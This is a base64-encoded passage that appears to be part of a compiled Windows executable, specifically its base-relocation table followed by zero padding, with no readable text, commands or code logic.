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DOcM6QzrDO0M7wzxDPMM9Qz3DPkM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0RDRMNFQ0XDRkNGw0dDR8NIQ0jDSUNJw0pDSsNLQ0vDTENMw01DTcNOQ07DT0NPw0BDUMNRQ1HDUkNSw1NDU8NUQ1TDVUNVw1ZDVsNXQ1fDWENYw1lDWcNaQ1rDW0Nbw1xDXMNdQ13DXkNew19DX8NQQ2DDYUNhw2JDYsNjQ2PDZENkw2VDZcNvA+9D74Pvw+AD8EPwg/DD8QPxQ/GD8cPyA/JD8oPyw/MD80Pzg/PD9AP0Q/SD9MP1A/VD9YP1w/YD9kP2g/fD+AP4Q/iD+MP5A/lD+YP5w/oD+kP6g/rD/UP9g/3D8AAAAAAQBAAAAArDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOXw6gDqEOog6AAAAEAEAXAMAADgyPDJAMkQy3DLkMuwy9DL8MgQzDDMUMxwzJDMsMzQzPDNEM0wzVDNcM2QzbDN0M3wzhDOMM5QznDOkM6wztDO8M8QzzDPUM9wz5DPsM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0RDRMNFQ0XDRkNGw0dDR8NIQ0jDSUNJw0pDSsNLQ0vDTENMw01DTcNOQ07DT0NPw0BDUMNRQ1HDUkNSw1NDU8NUQ1TDVUNVw1ZDVsNXQ1fDWENYw1lDWcNaQ1rDW0Nbw1xDXMNdQ13DXkNew19DX8NQQ2DDYUNhw2JDYsNjQ2PDZENkw2VDZcNmQ2bDZ0Nnw2hDaMNpQ2nDakNqw2tDa8NsQ2zDbUNtw25DbsNvQ2/DYENww3FDccNyQ3LDc0Nzw3RDdMN1Q3XDdkN2w3dDd8N4Q3jDeUN5w3pDesN7Q3vDfEN8w31DfcN+Q37Df0N/w3BDgMOBQ4HDgkOCw4NDg8OEQ4TDhUOFw4ZDhsOHQ4fDiEOIw4lDicOKQ4rDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOWQ5bDl0OXw5hDmMOZQ5nDmkOaw5tDm8OcQ5zDnUOdw55DnsOfQ5+DkAOgg6EDoYOiA6KDowOjg6QDpIOlA6WDpgOmg6cDp4OoA6iDqQOpg6oDqoOrA6uDrAOsg60DrYOuA66DrwOvg6ADsIOxA7GDsgOyg7MDs4O0A7SDtQO1g7YDtoO3A7eDuAO4g7kDuYO6A7qDuwO7g7wDvIO9A72DvgO+g78Dv4OwA8CDwQPBg8IDwoPDA8ODxAPEg8UDxYPGA8aDxwPHg8gDyIPJA8mDygPKg8sDy4PMA8yDzQPNg84DzoPPA8+DwAPQg9ED0YPSA9KD0wPTg9QD1IPVA9WD1gPWg9cD14PYA9iD2QPZg9oD2oPbA9uD3APcg90D3YPeA96D3wPfg9AD4IPhA+GD4gPig+MD44PkA+SD5QPlg+YD5oPnA+eD6APog+kD6YPqA+qD6wPrg+wD7IPtA+2D7gPug+8D74PgA/CD8QPxg/ID8oPzA/OD9AP0g/UD9YP2A/aD9wP3g/gD+IP5A/mD+gP6g/sD+4P8A/yD/QP9g/4D/oP/A/+D8AAAAgAQBQAAAAADAIMBAwGDAgMCgwMDA4MEAwSDBQMFgwYDBoMHAweDCAMIgwkDCYMKAwqDCwMLgwwDDIMNAw2DDgMOgw8DD4MAAxCDEQMQAAADABAMwAAABQM1QzWDNcM2AzZDNoM2wzcDN0M3gzfDOAM4QziDOMM5AzlDOYM5wzoDOkM6gzrDOwM7QzuDO8M8AzxDPIM8wz0DPUM9gz3DPgM+Qz6DPsM/Az9DP4M/wzADQENAg0DDQQNBQ0GDQcNCA0JDQoNCw0MDQ0NDg0PDRANEQ0SDRMNFA0VDRYNFw0YDRkNGg0bDRwNHQ0eDR8NIA0hDSINIw0kDSUNJg0nDSgNKQ0qDSsNLA0tDS4NLw0wDTENMg0zDTQNNQ0AEABALQCAACEM4gzjDOQM5QzmDOcM6AzpDOoM6wzsDO0M7gzvDPAM8QzyDPMM9Az1DPYM9wz4DPkM+gz7DPwM/Qz+DP8MwA0BDQINAw0EDQUNBg0HDQgNCQ0KDQsNDA0NDQ4NDw0QDRENEg0TDRQNFQ0WDRcNGA0ZDRoNGw0cDR0NHg0fDSANIQ0iDSMNJA0lDSYNJw0oDSkNKg0rDSwNLQ0uDS8NMA0xDTINMw00DTUNNg03DTgNOQ06DTsNPA09DT4NPw0ADUENUQ1SDXENdw17DXwNQQ2CDYYNhw2IDYoNkA2UDZUNmQ2aDZsNnQ2jDacNqA2sDa0Nrg2vDbENtw27DbwNgA3BDcINww3FDcsNzw3QDdQN1Q3XDd0N4Q3iDeYN5w3rDewN7Q3vDfUN+Q36DcAOBA4FDgYOBw4MDg0ODg4UDhUOGw4fDiAOJA4lDiYOKA4uDjIONg43DjgOOQ4+Dj8OAA5BDkMORA5FDkcOSA5JDksOTA5NDk8OUA5RDlMOVA5VDlcOWA5ZDlsOXQ5eDl8OYQ5iDmMOZA5mDmcOaQ5qDmsObQ5uDm8OcQ5yDnMOdA52DncOeA56DnsOfQ5+DkAOgg6EDoYOiA6KDosOjQ6PDpEOlw6YDp4Onw6lDqYOrA6tDrMOtA66DrsOgQ7CDsgOyQ7PDtAO1g7XDt0O3g7kDuUO6w7sDvIO8w75DvoOwA8BDwcPCA8ODw8PFQ8WDxwPHQ8jDyQPKg8rDzEPMg84DzkPPw8AD0YPSg9OD1IPVg9aD14PYg9mD2oPbg9yD3YPeg9+D0IPhg+KD44Pkg+WD5oPng+iD6YPqg+rD68PsA+0D7UPuQ+6D74Pvw+DD8QPyA/JD80Pzg/SD9MP1w/YD9wP3Q/hD+IP5g/nD+sP7A/wD/EP9Q/2D/oP+w//D8AUAEAQAEAAAAwEDAUMCQwKDA4MDwwTDBQMGAwZDB0MHgwiDCMMJwwoDAkMSwxNDE4MUAxVDFcMXAxeDGMMZQxnDGkMagxrDG0Mcgx0DHYMeAx5DHoMfAxBDIgMkAyYDJ8MoAyoDK8MsAy4DIAMyAzQDNgM4AzjDOoM7QzzDPQM+wz8DMQNDA0UDRYNFw0eDSANIQ0nDSgNLw0wDTQNPQ0ADUINTQ1ODVANUg1UDVUNVw1cDWQNaw1sDXQNfA1EDYwNjw2WDZ4Npg2uDbYNuQ27DYwN0Q3VDdkN3A3kDecN7w3yDfoN/Q3FDggOEA4SDhQOFw4fDiEOIw4mDi4OMA4yDjUOPQ4ADkkOSw5NDk8OUQ5TDlUOVw5ZDlsOXg5mDmkOcQ50DnwOfg5BDokOiw6ODpYOmQ6hDqMOpg6uDrAOgBwAQA4AQAAADAcMDgwWDB4MKAw4DAINgw2EDYUNhg2HDYgNiQ2KDYsNjA2NDY4Njw2QDZENkg2TDZQNlQ2WDZcNmA2ZDZoNmw2cDZ0Nng2fDaANoQ2iDaMNpA2lDaYNpw2oDakNqg2rDawNrw2wDbENsg2zDbQNtQ22DbcNuA25DboNuw28Db0Nvg2/DYANwQ3CDcMNxA3FDcYNxw3IDckNyg3LDcwNzQ3ODc8N0A3RDdIN0w3UDdUN1g3XDdgN2Q3aDdsN5Q3pDe0N8Q31Df0NwA4BDgIOAw4NDg4ODw48DkwOzQ7ODs8O0A7RDtIO0w7UDtUO2A7aDtsO3A7dDt4O3w7gDuEO4g7jDuYO5w7oDukO6g7rDuwO7Q7wDvEO8g70DtwPpw+yD7sPhg/SD98P6g/2D8AAACAAQA0AAAACDA8MGQwhDCkMMAw3DD4MBgxNDFUMXAxmDHEMegxBDIgMjgyVDJsMnAydDIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA